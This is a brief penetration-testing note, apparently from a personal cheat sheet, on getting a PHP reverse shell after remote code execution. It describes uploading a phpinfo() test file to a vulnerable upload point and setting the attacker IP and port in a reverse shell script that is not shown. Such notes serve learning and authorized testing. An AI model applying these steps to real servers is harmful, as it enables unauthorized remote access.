# Once RCE is achieved

### Conditions to use: 

1. Target machine can execute PHP code via vulnerable application
2. If we can upload a file, then navigate to that file to execute

#### Ways to test conditions: 

Upload `<?php phpinfo(); ?>` to the uploadable location and navigate to the file.

If the code executes, we are golden for a php reverse shell.

#### Configure the following lines in the script: 


```
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS

```
